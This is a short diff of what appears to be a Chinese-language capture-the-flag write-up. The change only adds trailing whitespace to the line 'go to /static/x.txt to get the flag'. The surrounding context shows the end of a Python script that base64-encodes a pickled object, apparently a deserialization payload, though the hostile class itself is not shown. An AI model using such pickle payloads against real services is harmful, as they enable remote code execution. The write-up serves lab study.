@@ -107,5 +107,5 @@ class P:
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)).decode())
 ```
-去/static/x.txt拿到flag
+去/static/x.txt拿到flag  
 <img width="600" alt="image" src="https://github.com/user-attachments/assets/e8921f7d-036d-433e-bb60-971d533f2b4b" />
